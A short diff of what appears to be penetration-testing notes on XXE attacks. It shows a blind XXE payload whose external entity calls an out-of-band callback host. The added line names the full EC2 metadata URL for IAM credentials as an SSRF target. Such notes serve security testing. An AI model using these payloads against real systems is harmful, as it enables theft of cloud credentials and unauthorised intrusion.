@@ -12,7 +12,7 @@ Keep in mind that XML is just a data transfer format. Make sure you also test an
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://zhkjg0n2ikpienyuf43fiyvuelkc82wr.oastify.com"> ]>  >> For Blind xxe attack.
 &xxe;
 ```
-Note: /latest/meta-data/iam/security-credentials/admin endpoint EC2 to retrieve info for SSRF.
+Note: http://169.254.169.254/latest/meta-data/iam/security-credentials/admin endpoint EC2 to retrieve info for SSRF.
 #### Example:
 Before Injection:
 ```xml
